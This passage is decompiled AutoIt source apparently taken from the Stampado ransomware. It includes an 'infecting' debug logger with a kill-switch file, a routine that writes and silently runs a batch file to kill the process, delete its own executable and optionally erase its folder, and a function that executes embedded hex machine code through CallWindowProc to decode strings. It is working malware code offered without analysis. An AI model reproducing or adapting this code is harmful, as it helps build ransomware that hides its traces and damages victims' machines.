	EndIf
	_GA("Done infecting")
EndFunc
Func _GA($AX)
	If _G1() <> "debug" Then Return 0
	If FileExists(@DesktopDir & "\stampado_kill.txt") Then
		FileDelete(@DesktopDir & "\stampado_kill.txt")
		Exit
	EndIf
	FileWriteLine(@DesktopDir & "\Stampado_debug.txt", "[" & @YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC & "] " & $AX)
EndFunc
Func _GB($CQ = 5, $CR = Default, $CS = Default)
	If @Compiled = 0 Then
		Return SetError(1, 0, 0)
	EndIf
	Local $CT = @ScriptName
	$CT = StringLeft($CT, StringInStr($CT, ".", $3M, -1) - 1)
	While FileExists(@TempDir & "\" & $CT & ".bat")
		$CT &= Chr(Random(65, 122, 1))
	WEnd
	$CT = @TempDir & "\" & $CT & ".bat"
	Local $CU = ""
	$CQ = Int($CQ)
	If $CQ > 0 Then
		$CU = "IF %TIMER% GTR " & $CQ & " GOTO DELETE"
	EndIf
	Local $CV = ""
	If $CS Then
		$CV = 'RD /S /Q "' & FileGetShortName(@ScriptDir) & '"' & @CRLF
	EndIf
	Local $CW = @ScriptName, $CX = "IMAGENAME"
	If $CR Then
		$CW = @AutoItPID
		$CX = "PID"
	EndIf
	Local Const $CY = 2, $CZ = FileGetShortName(@ScriptFullPath)
	Local Const $68 = "SET TIMER=0" & @CRLF & ":START" & @CRLF & "PING -n " & $CY & " 127.0.0.1 > nul" & @CRLF & $CU & @CRLF & "SET /A TIMER+=1" & @CRLF & @CRLF & 'TASKLIST /NH /FI "' & $CX & " EQ " & $CW & '" | FIND /I "' & $CW & '" >nul && GOTO START' & @CRLF & "GOTO DELETE" & @CRLF & @CRLF & ":DELETE" & @CRLF & 'TASKKILL /F /FI "' & $CX & " EQ " & $CW & '"' & @CRLF & 'DEL "' & $CZ & '"' & @CRLF & 'IF EXIST "' & $CZ & '" GOTO DELETE' & @CRLF & $CV & "GOTO END" & @CRLF & @CRLF & ":END" & @CRLF & 'DEL "' & $CT & '"'
	Local Const $67 = FileOpen($CT, $1W)
	If $67 = -1 Then
		Return SetError(2, 0, 0)
	EndIf
	FileWrite($67, $68)
	FileClose($67)
	Return Run($CT, @TempDir, @SW_HIDE)
EndFunc
Func _GD($14)
	Local $X = "0xC81000005356578365F800E8500000003EFFFFFF3F3435363738393A3B3C3DFFFFFF00FFFFFF000102030405060708090A0B0C0D0E0F10111213141516171819FFFFFFFFFFFF1A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132338F45F08B7D0C8B5D0831D2E9910000008365FC00837DFC047D548A034384C0750383EA033C3D75094A803B3D75014AB00084C0751A837DFC047D0D8B75FCC64435F400FF45FCEBED6A018F45F8EB1F3C2B72193C7A77150FB6F083EE2B0375F08A068B75FC884435F4FF45FCEBA68D75F4668B06C0E002C0EC0408E08807668B4601C0E004C0EC0208E08847018A4602C0E00624C00A46038847028D7F038D5203837DF8000F8465FFFFFF89D05F5E5BC9C21000"
	Local $1F = DllStructCreate("byte[" & BinaryLen($X) & "]")
	DllStructSetData($1F, 1, $X)
	Local $D0 = DllStructCreate("byte[" & BinaryLen($14) & "]")
	Local $1A = DllCall("user32.dll", "int", "CallWindowProc", "ptr", DllStructGetPtr($1F), "str", $14, "ptr", DllStructGetPtr($D0), "int", 0, "int", 0)
	Return BinaryToString(BinaryMid(DllStructGetData($D0, 1), 1, $1A[0]))
EndFunc
; DeTokenise by myAut2Exe >The Open Source AutoIT/AutoHotKey script decompiler< 2.12 build(182)
